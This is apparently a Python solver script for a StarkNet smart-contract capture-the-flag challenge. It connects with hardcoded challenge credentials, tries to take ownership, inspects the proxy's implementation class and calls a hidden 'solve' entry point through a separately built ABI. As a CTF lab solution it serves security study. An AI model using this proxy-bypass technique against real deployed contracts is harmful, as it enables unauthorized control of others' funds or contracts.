# Usage:
import asyncio
import json
import os
import subprocess
from pathlib import Path

from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.signer.stark_curve_signer import KeyPair
from starkware.starknet.definitions.general_config import StarknetChainId
from starkware.starknet.public.abi import get_selector_from_name

uuid = "e88b9100-8206-4814-86f5-e9908e444e94"
endpoint = "http://e88b9100-8206-4814-86f5-e9908e444e94@18.157.198.111:5061"
private_key = "0xa7cc40527801f4d96d33a8266fc62ff9"
player_address = "0x5a7f54c1e68cfe81cfeac27567e3481b1abb3d42f12e3fcd59c94a8d4cb91d4"
contract_address = "0x7b6ae87accdad39ccb73c55d201a186d72c49264a267f9ad86d3d52933bbbba"

private_key = int(private_key, 16)
player_address = int(player_address, 16)


async def run():

    gateway_client = GatewayClient(net=endpoint, chain=StarknetChainId.TESTNET)
    account_client = AccountClient(
        address=player_address,
        client=gateway_client,
        chain=StarknetChainId.TESTNET,
        key_pair=KeyPair.from_private_key(private_key),
        supported_tx_version=1,
    )

    contract = await Contract.from_address(contract_address, account_client)
    [a["name"] for a in contract.data.abi]

    # Player is not owner and cannot be set as
    await contract.functions["get_is_owner"].call(player_address)
    tx = await contract.functions["set_owner"].invoke(player_address, max_fee=int(1e16))
    await tx.wait_for_acceptance()

    implementation_hash = await contract.functions["get_implementation"].call()
    class_hash = await gateway_client.get_class_hash_at(contract_address)
    main_contract = await gateway_client.get_class_by_hash(class_hash)
    implementation_contract = await gateway_client.get_class_by_hash(
        implementation_hash
    )
    main_contract.entry_points_by_type.external
    implementation_contract.entry_points_by_type.external

    get_selector_from_name("solve")
    get_selector_from_name("is_solved")

    solve_me_abi = json.load(open("solve-me/build/solve-me.json"))["abi"]
    contract = Contract(contract_address, solve_me_abi, account_client)
    tx = await contract.functions["solve"].invoke(max_fee=int(1e16))
    await tx.wait_for_acceptance()

    await contract.functions["is_solved"].call()


if __name__ == "__main__":
    asyncio.run(run())
